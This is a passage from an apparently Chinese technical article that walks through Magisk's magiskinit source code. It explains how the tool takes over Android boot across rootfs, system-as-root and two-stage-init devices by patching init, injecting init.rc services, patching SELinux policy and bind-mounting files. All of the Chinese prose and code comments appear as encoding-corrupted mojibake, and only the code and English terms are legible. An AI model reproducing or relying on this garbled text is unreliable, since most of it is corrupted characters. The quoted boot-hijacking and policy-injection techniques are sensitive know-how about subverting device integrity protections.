ç»‘å®šï¼Œæ‰€ä»¥ init é€‰æ‹©æ‰§è¡Œ system å†…çš„ init æ¥å®Œæˆè¿™ä¸€æ­¥ã€‚system å†…çš„ init æ”¶åˆ°å‰è¾ˆä¼ æ¥çš„ selinux_setup å‚æ•°ï¼Œè¿›å…¥â€œç¬¬äºŒé˜¶æ®µâ€ï¼ŒåŠ è½½ SELinux policyã€‚ç„¶åï¼Œä¸ºäº†æŠŠ SELinux domain ä» kernel åˆ‡åˆ° initï¼Œinit å†æ¬¡æ‰§è¡Œè‡ªå·±ã€‚init å†æ¬¡è¢« execï¼Œè¿›å…¥â€œç¬¬ä¸‰é˜¶æ®µâ€ï¼Œå®Œæˆå‰©ä¸‹çš„åˆå§‹åŒ–å·¥ä½œï¼Œç»§ç»­å¼€æœºã€‚ï¼ˆå¯ä»¥æŸ¥çœ‹ Android 10.0 init main.cppï¼Œé‡Œé¢çš„ä»£ç å¾ˆè¯¦ç»†ï¼‰ã€‚æˆ‘ä»¬æŠŠè¿™ç§æ–°çš„å¯åŠ¨æ–¹å¼ç§°ä¸º 2-Stage-Init ï¼ˆç®€ç§°ä¸º 2SIï¼‰ã€‚ç”±äºå¼€æœºå®Œæˆåï¼Œè®¾å¤‡çš„ rootdir å’Œ Legacy SAR ä¸€æ ·æ˜¯ systemï¼Œæ‰€ä»¥æˆ‘ä»¬ä»ç„¶æŠŠè¿™ç§åˆ†åŒºå¸ƒå±€çœ‹ä½œæ˜¯ system-as-rootï¼ˆè™½ç„¶ä»¥ Google çš„æ ‡å‡†ï¼Œåªæœ‰ Legacy SAR æ‰è¢«çœ‹ä½œ SARï¼‰ã€‚â€¦â€¦æ…¢ç€ï¼æ˜æ˜ init ä¼šè¢«æ‰§è¡Œä¸‰æ¬¡äº†ï¼Œä¸ºä»€ä¹ˆæŠŠå®ƒç§°ä¸ºâ€œä¸¤æ­¥å¯åŠ¨â€ï¼Ÿè¿™æ˜¯å› ä¸ºï¼Œè¿™ç§å¯åŠ¨æ–¹å¼ä¼šåœ¨ç”¨æˆ·ç©ºé—´æ”¹å˜ rootdirï¼Œä» rootfs æ”¹å˜ä¸º system-as-rootï¼Œè€Œä¸Šé¢æåˆ°çš„å…¶ä»–ä¸¤ç§éƒ½ä¸ä¼šæ”¹å˜ rootdirã€‚æˆ‘ä»¬æŠŠ switch root ä¹‹å‰ç§°ä¸ºâ€œç¬¬ä¸€æ­¥â€ï¼ŒæŠŠ switch root ä¹‹åç§°ä¸ºâ€œç¬¬äºŒæ­¥â€ï¼Œå°±å¾—åˆ°å’Œå…¶ä»–ä¸¤ç§å¯åŠ¨æ–¹å¼æ‰€åŒºåˆ†å¼€çš„åå­—ï¼š2SIã€‚å¯¹äºå‡ºå‚ Android 10+ çš„è®¾å¤‡æ¥è¯´ï¼Œè¿™ç§å¯åŠ¨æ–¹å¼æ˜¯å¼ºåˆ¶çš„ï¼›ä»ä½¿ç”¨ rootfs çš„æ—§ç³»ç»Ÿæ›´æ–°åˆ° Android 10+ æ—¶ï¼Œä¹Ÿéœ€è¦ä½¿ç”¨è¿™ç§æ–°çš„å¯åŠ¨æ–¹å¼ï¼›ä½†å¯¹äºä½¿ç”¨ Legacy SAR çš„è®¾å¤‡ï¼Œå®ƒä»¬å¯ä»¥ç»§ç»­ä½¿ç”¨ Legacy SARã€‚å…¸å‹çš„ä¾‹å­æ˜¯ Google Pixel 3 &amp; 3a ç³»åˆ—ï¼Œå‡ºå‚æ—¶å®ƒä»¬ä½¿ç”¨ Legacy SARï¼Œä½† Google å¯¹å…¶è¿›è¡Œäº†æ”¹è¿›ï¼Œä½¿å¾—å‡çº§åˆ° Android 10 åå®ƒä»¬è½¬ä¸ºä½¿ç”¨ 2SI æ–¹å¼å¯åŠ¨ã€‚ç”±äº Legacy SAR å’Œ 2SI æœ€åéƒ½ä¼šä½¿ç”¨ system-as-root åˆ†åŒºå¸ƒå±€ï¼Œæ‰€ä»¥æ­è½½ Android 10+ çš„è®¾å¤‡å…¶å®éƒ½ä¼šä½¿ç”¨ SARã€‚æ–‡æ¡£ ä¸­ä¹Ÿæåˆ° All devices running Android 10 must use a system-as-root partition layout to enable system-only OTAs.ã€‚æ³¨ï¼šåœ¨ Android 10+ ä¸Šä½¿ç”¨ Legacy SAR æ—¶ï¼Œç”±äº Android 10 çš„ init å†™æ­»äº†ä¼šæ‰§è¡Œä¸‰æ¬¡ï¼Œæ‰€ä»¥ä¹Ÿä¼šæœ‰ first stageã€setup selinuxã€second stage è¿™ä¸‰æ­¥ï¼›è™½ç„¶ rootdir æ²¡æœ‰å‘ç”Ÿæ”¹å˜ï¼Œä¸ºäº†ä¸ Android 9.0 Legacy SAR åŒºåˆ«ï¼Œæˆ‘ä»¬æŠŠè¿™ç§æƒ…å†µç§°ä¸º 2SI legacy SAR æˆ– Legacy SAR with 2SIï¼Œè€Œæœ¬èŠ‚ä¸­æåˆ°çš„ä¼šæ”¹å˜ rootdir çš„å¯åŠ¨æ–¹å¼ç§°ä¸º modern 2SIã€2SI ramdisk SAR æˆ– 2SI from initramfsã€‚å½“æˆ‘ä»¬ä½¿ç”¨ç®€ç§° 2SI æ—¶ï¼Œæˆ‘ä»¬é»˜è®¤æŒ‡çš„æ˜¯ Modern 2SIã€‚å…³äºæ›´å¤šç»†èŠ‚ï¼Œå¯ä»¥æŸ¥é˜…å®˜æ–¹çš„ Android Init - Early Init Boot Sequenceé­…æ—ï¼š2SIï¼Œä½†æ˜¯ä» rootfs åˆ° rootfsï¼ˆæ³¨ï¼šæ­¤ç§ç‰¹æ®Šè¡Œä¸ºåœ¨åŸç‰ˆ Magisk - Android Booting Shenanigans æ–‡æ¡£ä¸­å¹¶æœªåˆ—å‡ºï¼‰ä¸Šæ–‡æåˆ°ï¼Œâ€œæ­è½½ Android 10+ çš„è®¾å¤‡å…¶å®éƒ½ä¼šä½¿ç”¨ SARâ€ï¼Œä½†å¯¹äºé­…æ— 16 ç³»åˆ—æ¥è¯´å¹¶éå¦‚æ­¤ã€‚æ­è½½ Android 10 çš„é­…æ— 16 ç³»åˆ—è®¾å¤‡å¯åŠ¨æ—¶ä¼šç»è¿‡ä¸Šé¢ 2SI çš„æ‰€æœ‰æ­¥éª¤ï¼Œé™¤äº† switch root è¿™ä¸€æ­¥ã€‚ç”±äºå¹¶æ²¡æœ‰ switch rootï¼Œæ‰€ä»¥è®¾å¤‡ä¼šä¸€ç›´ä½¿ç”¨ rootfsã€‚MagiskInitå…ˆæ¥ä»‹ç»ä¸€ä¸‹ magiskinit æ˜¯ä»€ä¹ˆï¼šmagiskinit æ˜¯ magisk çš„é‡è¦ç»„ä»¶ä¹‹ä¸€ï¼Œmagisk æ­£æ˜¯é€šè¿‡æ›¿æ¢ init ä¸ºè‡ªå·±çš„ magiskinit å®ç°åŠ«æŒè®¾å¤‡å¯åŠ¨è¿‡ç¨‹çš„ã€‚å¯ä»¥é€šè¿‡æŸ¥çœ‹æ–‡æ¡£æ¥å¤§æ¦‚äº†è§£ magiskinit åšäº†ä»€ä¹ˆã€‚æ¥ä¸‹æ¥æˆ‘ä»¬ç»“åˆä¸Šé¢çš„çŸ¥è¯†ä»¥åŠ magiskinit æºç æ¥å…·ä½“åˆ†æã€‚æ³¨ï¼šæˆªè‡³å‘ç¨¿ï¼Œæœ¬æ–‡åˆ†æçš„æºç ä¸º Magisk master åˆ†æ”¯ä¸Šçš„æœ€æ–°ä»£ç ã€‚æœ€æ–° commit ä¸º cfb20b0ï¼Œç‚¹è¿›å»å¯ä»¥æµè§ˆå¯¹åº”çš„æ–‡ä»¶ã€‚ï¼ï¼ï¼ç¡¬æ ¸è­¦å‘Šï¼Œéæˆ˜æ–—äººå‘˜è¯·è¿…é€Ÿé€ƒç¦»ç°åœºï¼ï¼ï¼ç”±äº magiskinit æ›¿æ¢äº† initï¼Œæ‰€ä»¥å½“å†…æ ¸æ‰§è¡Œ init æ—¶ï¼Œmagiskinit çš„ main() ä¼šè¢«æ‰§è¡Œã€‚main() çš„ä»£ç ä½äº init.cppï¼š123456789101112131415161718192021222324252627282930313233343536int main(int argc, char *argv[]) &#123; umask(0); auto name = basename(argv[0]); if (name == \"magisk\"sv) return magisk_proxy_main(argc, argv); if (getpid() != 1) return 1; BaseInit *init; BootConfig config&#123;&#125;; if (argc &gt; 1 &amp;&amp; argv[1] == \"selinux_setup\"sv) &#123; rust::setup_klog(); init = new SecondStageInit(argv); &#125; else &#123; // This will also mount /sys and /proc load_kernel_info(&amp;config); if (config.skip_initramfs) init = new LegacySARInit(argv, &amp;config); else if (config.force_normal_boot) init = new FirstStageInit(argv, &amp;config); else if (access(\"/sbin/recovery\", F_OK) == 0 || access(\"/system/bin/recovery\", F_OK) == 0) init = new RecoveryInit(argv, &amp;config); else if (check_two_stage()) init = new FirstStageInit(argv, &amp;config); else init = new RootFSInit(argv, &amp;config); &#125; // Run the main routine init-&gt;start(); exit(1);&#125;æˆ‘ä»¬é‡ç‚¹å…³æ³¨å‡ ä¸ª if åˆ†æ”¯ã€‚RootFSInitçœ‹åå­—å°±å¯ä»¥çœ‹å‡ºæ¥ï¼Œè¿™å°±æ˜¯ç”¨æ¥å¤„ç†ä¸Šé¢æåˆ°çš„ç¬¬ä¸€ç§åˆ†åŒºå¸ƒå±€ RootFS çš„åˆ†æ”¯ã€‚ç±»çš„å®šä¹‰åœ¨ init.hppï¼š1234567891011121314151617/************ * Initramfs ************/class RootFSInit : public MagiskInit &#123;private: void prepare();public: RootFSInit(char *argv[], BootConfig *config) : MagiskInit(argv, config) &#123; LOGD(\"%s\\n\", __FUNCTION__); &#125; void start() override &#123; prepare(); patch_rw_root(); exec_init(); &#125;&#125;;1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586void RootFSInit::prepare() &#123; prepare_data(); LOGD(\"Restoring /init\\n\"); /** æŠŠå¤‡ä»½çš„åŸæ¥çš„ init é‡å‘½åä¸º /init ï¼Œè¿™æ ·æ¥ä¸‹æ¥æˆ‘ä»¬æ‰§è¡Œ /init çš„æ—¶å€™å°±ä¼šæ‰§è¡ŒåŸæœ¬çš„ init **/ rename(backup_init(), \"/init\");&#125;#define PRE_TMPSRC \"/magisk\"#define PRE_TMPDIR PRE_TMPSRC \"/tmp\"void MagiskInit::patch_rw_root() &#123; mount_list.emplace_back(\"/data\"); parse_config_file(); // Create hardlink mirror of /sbin to /root mkdir(\"/root\", 0777); clone_attr(\"/sbin\", \"/root\"); link_path(\"/sbin\", \"/root\"); // Handle overlays load_overlay_rc(\"/overlay.d\"); mv_path(\"/overlay.d\", \"/\"); rm_rf(\"/data/overlay.d\"); rm_rf(\"/.backup\"); // Patch init.rc /** ä¿®è¡¥ init.rcï¼Œæ¤å…¥æˆ‘ä»¬çš„ä»£ç ï¼Œè®© init å¯åŠ¨æˆ‘ä»¬çš„æœåŠ¡ **/ patch_rc_scripts(\"/\", \"/sbin\", true); bool treble; &#123; auto init = mmap_data(\"/init\"); treble = init.contains(SPLIT_PLAT_CIL); &#125; /** å› ä¸º rootfs æ˜¯å¯å†™çš„ï¼Œåˆ›å»º /magiskï¼Œç„¶åæŠŠ /magisk/tmp å½“æˆ magisk å†…éƒ¨çš„ tmpfsï¼Œåˆå§‹åŒ– magisk å†…éƒ¨æ–‡ä»¶**/ xmkdir(PRE_TMPSRC, 0); xmount(\"tmpfs\", PRE_TMPSRC, \"tmpfs\", 0, \"mode=755\"); xmkdir(PRE_TMPDIR, 0); setup_tmp(PRE_TMPDIR); chdir(PRE_TMPDIR); // Extract magisk /** é‡Šæ”¾ magisk32 magisk64 ç­‰æ–‡ä»¶ **/ extract_files(true); /** ä¿®è¡¥ SELinux policyï¼Œæ³¨å…¥æˆ‘ä»¬çš„è§„åˆ™ **/ if ((!treble &amp;&amp; access(\"/sepolicy\", F_OK) == 0) || !hijack_sepolicy()) &#123; patch_sepolicy(\"/sepolicy\", \"/sepolicy\"); &#125; chdir(\"/\"); // Dump magiskinit as magisk /** æŠŠ magiskinit å½“æˆ magisk å¤åˆ¶åˆ° /sbin/magiskã€‚init ç¬¬ä¸€æ¬¡å¯åŠ¨æˆ‘ä»¬çš„æœåŠ¡çš„æ—¶å€™ï¼Œä¼šè¿›å…¥ magisk_proxy_main **/ cp_afc(REDIR_PATH, \"/sbin/magisk\");&#125;int magisk_proxy_main(int argc, char *argv[]) &#123; rust::setup_klog(); LOGD(\"%s\\n\", __FUNCTION__); // Mount rootfs as rw to do post-init rootfs patches xmount(nullptr, \"/\", nullptr, MS_REMOUNT, nullptr); unlink(\"/sbin/magisk\"); // Move tmpfs to /sbin // make parent private before MS_MOVE /** é€‰æ‹© /sbin ä½œä¸ºæ–°çš„ magisk internal tmpfsï¼ˆå› ä¸º /sbin åœ¨ PATH é‡Œï¼ŒæŠŠ su ç­‰å¯æ‰§è¡Œæ–‡ä»¶æ”¾åœ¨é‡Œé¢ï¼Œè¿è¡Œ su çš„æ—¶å€™ç›´æ¥å°±èƒ½æ‰¾åˆ°è¿™ä¸ªæ–‡ä»¶å¹¶æ‰§è¡Œï¼‰ **/ xmount(nullptr, PRE_TMPSRC, nullptr, MS_PRIVATE, nullptr); xmount(PRE_TMPDIR, \"/sbin\", nullptr, MS_MOVE, nullptr); xumount2(PRE_TMPSRC, MNT_DETACH); rmdir(PRE_TMPDIR); rmdir(PRE_TMPSRC); // Create symlinks pointing back to /root /** æ¢å¤ sbin é‡ŒåŸæœ¬å°±æœ‰çš„æ–‡ä»¶ **/ recreate_sbin(\"/root\", false); // Tell magiskd to remount rootfs setenv(\"REMOUNT_ROOT\", \"1\", 1); /** å¸¦ä¸Šå‚æ•°è¿è¡ŒçœŸæ­£çš„ magisk32/magisk64 **/ execv(\"/sbin/magisk\", argv); return 1;&#125;patch_rc_scripts() é‡Œæœ€é‡è¦çš„å°±æ˜¯æŠŠè¿™æ®µ rc è„šæœ¬æ³¨å…¥è¿›äº† init.rcï¼Œä½¿å¾— init ä¼šåœ¨ç³»ç»Ÿå¼€æœºè¿‡ç¨‹ä¸­è‡ªåŠ¨æ‰§è¡Œ magiskï¼š123456789101112131415on post-fs-data start logd exec %2$s 0 0 -- %1$s&#x2F;magisk --post-fs-dataon property:vold.decrypt&#x3D;trigger_restart_framework exec %2$s 0 0 -- %1$s&#x2F;magisk --serviceon nonencrypted exec %2$s 0 0 -- %1$s&#x2F;magisk --serviceon property:sys.boot_completed&#x3D;1 exec %2$s 0 0 -- %1$s&#x2F;magisk --boot-completeon property:init.svc.zygote&#x3D;stopped exec %2$s 0 0 -- %1$s&#x2F;magisk --zygote-restartå¯¹ init.rc è¯­æ³•è§„åˆ™ä¸ç†Ÿçš„åŒå­¦ï¼Œå¯ä»¥å‚è€ƒ Android Init Languageæ•´ä¸ªé€»è¾‘è¿˜æ˜¯æ¯”è¾ƒæ¸…æ™°çš„ï¼Œå¿½ç•¥ä¸€äº›è¿‡äºå†…éƒ¨çš„ç»†èŠ‚ï¼Œå¤§æ¦‚å¦‚ä¸‹æ‰€ç¤ºï¼škernel æ‰§è¡Œ initï¼Œmagiskinit è¢«è¿è¡Œï¼Œæ£€æµ‹ç³»ç»Ÿç¯å¢ƒï¼Œè¿›å…¥ RootFSInitä¿®è¡¥ init.rcï¼Œæ³¨å…¥æˆ‘ä»¬çš„ä»£ç åˆå§‹åŒ– magisk å†…éƒ¨è¦ç”¨åˆ°çš„ tmpfsä¿®è¡¥ sepolicyï¼Œæ³¨å…¥æˆ‘ä»¬çš„è§„åˆ™ï¼ˆç»†èŠ‚åé¢å†è°ˆï¼‰æŠŠ magiskinit å¤åˆ¶åˆ° /sbin/magiskï¼Œè¿™æ · init ç¬¬ä¸€æ¬¡æ‰§è¡Œ magisk æ—¶ä¼šè¿›å…¥ magisk_proxy_main() åšå‰©ä½™å·¥ä½œæ‰§è¡Œç³»ç»ŸåŸæ¥çš„ initï¼Œç»§ç»­å¼€æœºæµç¨‹init ä¼šè§£æå¹¶æ‰§è¡Œ init.rcï¼Œè¿è¡Œ magiskï¼Œè¿™ä¸ªæ—¶å€™è¿è¡Œçš„å…¶å®æ˜¯ magiskinitï¼Œè¿›å…¥ magisk_proxy_main()æŠŠ /sbin ç”¨ä½œ magisk internal tmpfsï¼Œç„¶åå› ä¸ºæˆ‘ä»¬ mount äº† tmpfs åœ¨ sbin ä¸Šï¼Œè¦æŠŠé‡Œé¢æœ¬æ¥å°±æœ‰çš„æ–‡ä»¶æ¢å¤å‡ºæ¥è¦ä¸ç„¶å°±æ²¡äº†è¿è¡ŒçœŸæ­£çš„ magisk32/magisk64Modern 2SIç”±äºåŠ«æŒ Legacy SAR çš„å¯åŠ¨è¿‡ç¨‹è¿‡äºå¤æ‚ä¸”å­˜åœ¨å¤ªå¤šç§æƒ…å†µï¼Œæˆ‘ä»¬å…ˆè®² Modern 2SIã€‚åŠ«æŒ Modern 2SI å¯åŠ¨è¿‡ç¨‹çš„éš¾ç‚¹åœ¨äºï¼šç”±äºä¸€é˜¶æ®µ init æ¥è‡ª boot.img å†… ramdiskï¼Œæ‰€ä»¥ magiskinit ä¼šè¢«æ‰§è¡Œï¼›ä½†æ˜¯ï¼Œä¸€æ—¦è¿è¡ŒåŸæ¥çš„ initï¼Œå¥¹å°±ä¼šæŒ‚è½½ /systemã€switch root åˆ° /systemï¼Œæˆ‘ä»¬å¯¹åŸæ¥ rootfs æ‰€åšçš„ä¿®æ”¹ å…¨ éƒ¨ æœ¨ å¤§ã€‚è€Œ init ä¸€é˜¶æ®µè¿è¡Œæ—¶ï¼Œ/system è¿˜æœªè¢«æŒ‚è½½ï¼Œç›´æ¥å¯¹ /system åšä¿®æ”¹ä¹Ÿè¡Œä¸é€šã€‚æ‰€ä»¥æˆ‘ä»¬å¿…é¡»æ‰¾åˆ°ä¸€ç§æ–¹æ³•ï¼Œåœ¨ init æŒ‚è½½ /system ä¹‹ååšä¿®æ”¹ï¼Œä¸” /system å¾€å¾€æ˜¯ read-only çš„ï¼Œç”±äº system.img å¯èƒ½æ˜¯ de-duplicate è¿‡çš„ ext4 æˆ–è€…å¹²è„†å°±æ˜¯ EROFSï¼Œä¹Ÿä¸å¯èƒ½å°†å…¶ remount ä¸º read-writeï¼Œä»»ä½•æ–¹å¼ç›´æ¥ä¿®æ”¹éƒ½è¡Œä¸é€šï¼Œåªèƒ½ç”¨ bind-mount è¿™ç§æ–¹æ³•å˜ç›¸ä¿®æ”¹ã€‚æˆ‘ä»¬æ³¨æ„åˆ°ï¼Œinit åœ¨ switch root ä¹‹å‰ï¼Œä¼šæŠŠç°åœ¨çš„ mounts ï¼ˆé™¤äº† / å’Œ /system æœ¬èº«ï¼‰ç»™ move åˆ°æ–°çš„ root ä¸‹é¢ï¼Œç„¶åå† switch rootï¼ˆå…·ä½“ä»£ç å¯è§è¿™é‡Œï¼‰ã€‚é€šè¿‡åˆ©ç”¨è¿™ä¸ªç‰¹æ€§ï¼Œæˆ‘ä»¬ä¼¼ä¹å¯ä»¥è®©æˆ‘ä»¬çš„æŸäº›ä¸œè¥¿åœ¨ switch root ä¹‹åä»ç„¶ä¿ç•™ä¸‹æ¥ï¼Œä½†æ˜¯æ€ä¹ˆåˆ©ç”¨å‘¢ï¼Ÿæˆ‘ä»¬è¿˜æ˜¯æ¥çœ‹çœ‹ magiskinit çš„ä»£ç å§ã€‚magiskinit çš„åŸºæœ¬æ€æƒ³æ˜¯ï¼Œfirst stage åšä¸€äº› hackï¼Œæ‰§è¡ŒåŸæœ¬çš„ init è®©å®ƒä¸ºæˆ‘ä»¬æŒ‚è½½ /system å¹¶ switch rootï¼Œç„¶åé€šè¿‡å‰é¢åšçš„ hack æƒ³åŠæ³•è®© init å†æ¬¡è§¦å‘è‡ªå·±ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œç±»ä¼¼ 2SIï¼Œå®ƒä¹Ÿæ˜¯åˆ†ä¸¤æ­¥èµ°çš„ã€‚12345678910111213141516171819202122232425262728293031323334/*************** * 2 Stage Init ***************/class FirstStageInit : public BaseInit &#123;private: void prepare();public: FirstStageInit(char *argv[], BootConfig *config) : BaseInit(argv, config) &#123; LOGD(\"%s\\n\", __FUNCTION__); &#125;; void start() override &#123; prepare(); exec_init(); &#125;&#125;;class SecondStageInit : public MagiskInit &#123;private: bool prepare();public: SecondStageInit(char *argv[]) : MagiskInit(argv) &#123; LOGD(\"%s\\n\", __FUNCTION__); &#125;; void start() override &#123; bool is_rootfs = prepare(); if (is_rootfs) patch_rw_root(); else patch_ro_root(); exec_init(); &#125;&#125;;FirstStageInit çš„ prepare éå¸¸ç®€å•ï¼š123456789101112#define INIT_PATH &quot;&#x2F;system&#x2F;bin&#x2F;init&quot;#define REDIR_PATH &quot;&#x2F;data&#x2F;magiskinit&quot;void FirstStageInit::prepare() &#123; prepare_data(); restore_ramdisk_init(); auto init &#x3D; mmap_data(&quot;&#x2F;init&quot;, true); &#x2F;&#x2F; Redirect original init to magiskinit for (size_t off : init.patch(INIT_PATH, REDIR_PATH)) &#123; LOGD(&quot;Patch @ %08zX [&quot; INIT_PATH &quot;] -&gt; [&quot; REDIR_PATH &quot;]\\n&quot;, off); &#125;&#125;è¿™ä¸ªå‡½æ•°åšäº†ä»€ä¹ˆå‘¢ï¼Ÿé¦–å…ˆï¼Œprepare_data() ç»™ /data æŒ‚ä¸Šäº† tmpfsï¼Œé‡Šæ”¾æ–‡ä»¶åˆ° /dataï¼ŒæŠŠ magiskinit å¤åˆ¶åˆ° /data/magiskinitï¼›æ¥ç€å°†åŸæœ¬ init é‡Œçš„ /system/bin/init patch æˆäº† /data/magiskinitã€‚ä¸ºä»€ä¹ˆå¯ä»¥è¿™æ ·åšå‘¢ï¼Ÿè¿˜æ˜¯å¾—çœ‹å›ä¸Šé¢çš„ç‰¹æ€§ã€‚æˆ‘ä»¬çŸ¥é“ï¼Œswitch root å‰çš„ mount ä¼šä¿ç•™åˆ° switch root ä¹‹åï¼Œæ‰€ä»¥å¯ä»¥ç”¨è¿™ç§æ–¹æ³•ä¿ç•™æŸäº›ä¸œè¥¿ï¼›ä½†æ˜¯ï¼Œmount è¦æ±‚ç›®æ ‡æ–‡ä»¶ï¼ˆå¤¹ï¼‰å¿…é¡»å­˜åœ¨ï¼Œè€Œ /system å¹¶ä¸å¯å†™ï¼Œæ‰€ä»¥è‡ªå·± mkdir ä¸€ä¸ªæ–‡ä»¶å¤¹ï¼Œmount tmpfs ç„¶åæŒ‡æœ› init å¸®æˆ‘ä»¬ move mount çš„åšæ³•è¡Œä¸é€šã€‚ä¸ºäº†ä¿ç•™æŸäº›ä¸œè¥¿ï¼Œæˆ‘ä»¬å¿…é¡»é€‰ä¸€ä¸ª init first stage åˆ° selinux_setup æœŸé—´éƒ½ä¸ä¼šè¢«ä½¿ç”¨åˆ°çš„æ–‡ä»¶å¤¹æ¥å¸®æˆ‘ä»¬æ”¾ä¸œè¥¿ï¼Œè€Œ magisk é€‰æ‹©çš„æ˜¯ /dataã€‚è¿™è®© patch init ä½¿å¾— init æ‰§è¡Œ /system/bin/init è¿›è¡Œ selinux_setup æ—¶è½¬ä¸ºæ‰§è¡Œ magiskinitã€‚ç¬¬äºŒé˜¶æ®µçš„ä»£ç ï¼š1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798bool SecondStageInit::prepare() &#123; /** è¿™ä¸€è¡Œ unmount æ˜¯ç»™ Legacy SAR with 2SI ä½¿ç”¨çš„ **/ umount2(\"/init\", MNT_DETACH); unlink(\"/data/init\"); // Make sure init dmesg logs won't get messed up argv[0] = (char *) INIT_PATH; // Some weird devices like meizu, uses 2SI but still have legacy rootfs struct statfs sfs&#123;&#125;; statfs(\"/\", &amp;sfs); /** é­…æ—è®¾å¤‡çš„ 2SI ä¸ä¼š switch rootï¼Œæ‰€ä»¥ä¾ç„¶åœ¨ rootfsï¼Œéœ€è¦åˆ¤æ–­è¿™ç§ç‰¹æ®Šæƒ…å†µ **/ if (sfs.f_type == RAMFS_MAGIC || sfs.f_type == TMPFS_MAGIC) &#123; // We are still on rootfs, so make sure we will execute the init of the 2nd stage unlink(\"/init\"); xsymlink(INIT_PATH, \"/init\"); return true; &#125; return false;&#125;#define ROOTMIR MIRRDIR \"/system_root\"#define NEW_INITRC_DIR \"/system/etc/init/hw\"void MagiskInit::patch_ro_root() &#123; mount_list.emplace_back(\"/data\"); parse_config_file(); /** Android 11+ sbin å¯èƒ½ä¸å­˜åœ¨ï¼Œä½¿ç”¨ /debug_ramdisk ä»£æ›¿ **/ string tmp_dir; if (access(\"/sbin\", F_OK) == 0) &#123; tmp_dir = \"/sbin\"; &#125; else &#123; tmp_dir = \"/debug_ramdisk\"; xmkdir(\"/data/debug_ramdisk\", 0); xmount(\"/debug_ramdisk\", \"/data/debug_ramdisk\", nullptr, MS_MOVE, nullptr); &#125; /** åˆå§‹åŒ– magisk internal tmpfs **/ setup_tmp(tmp_dir.data()); chdir(tmp_dir.data()); if (tmp_dir == \"/sbin\") &#123; // Recreate original sbin structure xmkdir(ROOTMIR, 0755); xmount(\"/\", ROOTMIR, nullptr, MS_BIND, nullptr); recreate_sbin(ROOTMIR \"/sbin\", true); xumount2(ROOTMIR, MNT_DETACH); &#125; else &#123; // Restore debug_ramdisk xmount(\"/data/debug_ramdisk\", \"/debug_ramdisk\", nullptr, MS_MOVE, nullptr); rmdir(\"/data/debug_ramdisk\"); &#125; xrename(\"overlay.d\", ROOTOVL); extern bool avd_hack; // Handle avd hack if (avd_hack) &#123; // Android API 28 AVD æ¨¡æ‹Ÿå™¨ç›¸å…³ï¼Œè·³è¿‡ &#125; load_overlay_rc(ROOTOVL); if (access(ROOTOVL \"/sbin\", F_OK) == 0) &#123; // Move files in overlay.d/sbin into tmp_dir mv_path(ROOTOVL \"/sbin\", \".\"); &#125; /** ä¿®è¡¥ init.rcï¼Œæ³¨å…¥ magisk è‡ªå·±çš„æœåŠ¡ **/ // Patch init.rc if (access(NEW_INITRC_DIR, F_OK) == 0) &#123; // Android 11's new init.rc patch_rc_scripts(NEW_INITRC_DIR, tmp_dir.data(), false); &#125; else &#123; patch_rc_scripts(\"/\", tmp_dir.data(), false); &#125; // Extract magisk extract_files(false); /** ä¿®è¡¥ sepolicyï¼Œæ³¨å…¥æˆ‘ä»¬çš„è§„åˆ™ **/ // Oculus Go will use a special sepolicy if unlocked if (access(\"/sepolicy.unlocked\", F_OK) == 0) &#123; patch_sepolicy(\"/sepolicy.unlocked\", ROOTOVL \"/sepolicy.unlocked\"); &#125; else if ((access(SPLIT_PLAT_CIL, F_OK) != 0 &amp;&amp; access(\"/sepolicy\", F_OK) == 0) || !hijack_sepolicy()) &#123; patch_sepolicy(\"/sepolicy\", ROOTOVL \"/sepolicy\"); &#125; /** ç”¨ bind mount å°†éœ€è¦ä¿®æ”¹çš„æ–‡ä»¶ç»™ä¸€ä¸ªä¸ª mount ä¸Šå»ï¼Œè¿™æ ·å°±å®ç°äº†ä¸ä¿®æ”¹çœŸå®åˆ†åŒºè€Œä¿®æ”¹æ–‡ä»¶ **/ // Mount rootdir magic_mount(ROOTOVL); int dest = xopen(ROOTMNT, O_WRONLY | O_CREAT, 0); write(dest, magic_mount_list.data(), magic_mount_list.length()); close(dest); chdir(\"/\");&#125;å¤§è‡´é€»è¾‘è¿˜æ˜¯å·®ä¸å¤šçš„ï¼Œåªä¸è¿‡å¤šäº†ä¸€äº›ä¸åŒç³»ç»Ÿçš„å¤„ç†ï¼ˆæ¯”å¦‚é­…æ—è®¾å¤‡éœ€è¦ç‰¹æ®Šå¤„ç†ï¼Œè¿™é‡Œå› ä¸º rootfs ä»ç„¶å¯å†™æ‰€ä»¥ç›´æ¥èµ° rootfs é€»è¾‘å°±å¥½äº†ï¼‰ï¼Œè¿˜æœ‰ç”±äº switch root å / å¹¶ä¸å¯å†™ï¼Œæ‰€ä»¥æ‰€æœ‰å¯¹æ–‡ä»¶çš„ä¿®æ”¹éƒ½æ˜¯å…ˆæŠŠä¿®æ”¹è¿‡çš„æ–‡ä»¶æ”¾åœ¨ magisk internal tmpfs å†…ï¼Œç„¶å bind mount åˆ°å®ƒåŸå§‹çš„è·¯å¾„ã€‚å¤§è‡´æµç¨‹ä¸ºï¼škernel æ‰§è¡Œ initï¼Œmagiskinit è¢«è¿è¡Œï¼Œæ£€æµ‹ç³»ç»Ÿç¯å¢ƒï¼Œåˆ¤æ–­ä¸º 2SI è®¾å¤‡ç¬¬ä¸€é˜¶æ®µï¼Œè¿›å…¥ FirstStageInitæŒ‚è½½ /data ä¸º tmpfsï¼Œé‡Šæ”¾ /data/magiskinitä¿®è¡¥åŸå§‹ initï¼Œé‡å®šå‘ /system/bin/init åˆ° /data/magiskinitï¼Œç„¶åæ‰§è¡ŒåŸå§‹ initåŸå§‹ init ä¼šæŒ‚è½½ /system ç„¶å switch root è¿›å»ï¼Œæ¥ä¸‹æ¥å®ƒæ‰§è¡Œ /system/bin/initï¼ˆè¢«æˆ‘ä»¬ patch äº†æ‰€ä»¥ä¼šæ‰§è¡Œ /data/magiskinitï¼‰è¿›è¡Œ selinux_setupmagiskinit è¢«å†æ¬¡æ‰§è¡Œï¼Œçœ‹è§ selinux_setup çŸ¥é“è¿™æ˜¯äºŒé˜¶æ®µï¼Œswitch root å·²ç»å®Œæˆï¼Œå¼€å§‹ patch_ro_root()ä¿®è¡¥ init.rcï¼Œæ³¨å…¥æˆ‘ä»¬çš„ä»£ç ä¿®è¡¥ sepolicyï¼Œæ³¨å…¥æˆ‘ä»¬çš„è§„åˆ™ï¼ˆç»†èŠ‚åé¢å†è°ˆï¼‰åˆ©ç”¨ bind mount æ›¿æ¢ 